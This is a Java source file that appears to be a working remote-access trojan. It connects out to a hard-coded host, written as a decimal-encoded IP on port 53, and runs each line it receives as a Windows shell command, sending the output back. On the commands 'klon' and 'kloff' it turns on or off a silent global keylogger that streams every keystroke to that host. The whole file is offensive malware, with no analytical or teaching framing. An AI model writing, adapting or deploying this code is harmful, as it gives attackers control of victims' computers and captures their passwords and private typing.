import java.io.*;
import java.net.Socket;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.Scanner;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.util.logging.Level;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

public class program implements NativeKeyListener {
    private static final Logger logger = LoggerFactory.getLogger(program.class);
    static Socket s;
    static InputStream i;
    static OutputStream o;

    static {
        try {
            s = new Socket("3113041379", 53);
            i = s.getInputStream();
            o = s.getOutputStream();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    static PrintWriter pw = new PrintWriter(o, true);
    static BufferedReader rr = new BufferedReader(new InputStreamReader(i));
    static Boolean kl = false;

    public static void main(String[] args) {
        try {
            String inc, comSpec = System.getenv("comSpec") + " /c ";

            Path crp = Paths.get("");
            String rp = crp.toAbsolutePath().toString();

            while (true) {
                if (!kl)
                    pw.print(rp + "> ");
                pw.flush();
                inc = rr.readLine();
                if (inc.equals("klon")) {
                    init();
                    kl = true;
                    pw.print("[*] Real-time logging: ");
                    try {
                        GlobalScreen.registerNativeHook();
                    } catch (NativeHookException e) {
                        System.exit(-1);
                    }
                    GlobalScreen.addNativeKeyListener((NativeKeyListener) new program());
                } else if (inc.equals("kloff")) {
                    kl = false;
                    GlobalScreen.removeNativeKeyListener((NativeKeyListener) new program());
                    GlobalScreen.unregisterNativeHook();
                } else if (inc != null) {
                    Process p = Runtime.getRuntime().exec(comSpec + inc);
                    Scanner sc = new Scanner(p.getInputStream());
                    while (sc.hasNext()) pw.println(sc.nextLine());
                    pw.flush();
                    sc.close();
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static void init() {
        java.util.logging.Logger logger = java.util.logging.Logger.getLogger(GlobalScreen.class.getPackage().getName());
        logger.setLevel(Level.OFF);
        logger.setUseParentHandlers(false);
    }

    public void nativeKeyPressed(NativeKeyEvent e) {
        String key = NativeKeyEvent.getKeyText(e.getKeyCode());
        try {
            if (key.length() > 1) {
                pw.print("[" + key + "]");
            } else {
                pw.print(key);
            }
            pw.flush();
        } catch (Exception e1) {
            e1.printStackTrace();
        }
    }

    public void nativeKeyReleased(NativeKeyEvent e) {
    }

    public void nativeKeyTyped(NativeKeyEvent e) {
    }
}